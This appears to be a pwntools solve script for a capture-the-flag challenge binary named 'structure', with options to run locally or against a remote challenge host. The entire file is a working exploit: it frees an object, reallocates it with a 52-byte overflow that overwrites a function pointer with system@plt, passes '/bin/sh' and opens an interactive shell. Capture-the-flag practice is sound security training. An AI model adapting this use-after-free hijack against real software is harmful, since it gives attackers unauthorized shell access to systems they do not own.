#!/usr/bin/env python2

"""
Run exploit locally with:
./solve.py

Run against remote with:
./solve.py REMOTE HOST=challenge.acictf.com PORT=60151
"""

from pwn import *

PROG_PATH = './structure'


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'vsplit', '-h']

    if not args['REMOTE']:
        context.log_level = 'debug'


def init_io():
    if args['REMOTE']:
        return remote(args['HOST'], int(args['PORT']))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


def create_plant(io, func_addr):
    io.sendlineafter('Simulation\n', '2')
    io.sendlineafter('kind of plant is this\n', '/bin/sh')
    io.sendlineafter('description of the plant\n', 'A'*52 + p64(func_addr))


def create_animal(io):
    io.sendlineafter('Simulation\n', '1')
    io.sendlineafter('kind of animal is this?\n', 'dog')
    io.sendlineafter("animal's name?\n", 'aaa')


def free(io, idx):
    io.sendlineafter('Simulation\n', '4')
    io.sendlineafter('to remove?\n', str(idx))


def run_simulation(io):
    io.sendlineafter('Simulation\n', '3')


def win(io):
    elf = context.binary

    create_animal(io)

    # To populate system GOT entry.
    run_simulation(io)

    free(io, 0)
    create_plant(io, elf.plt['system'])
    run_simulation(io)
    io.interactive()


if __name__ == '__main__':
    init_pwntools_context()
    io = init_io()
    
    if args['PAUSE']:
        raw_input('PAUSED...')

    win(io)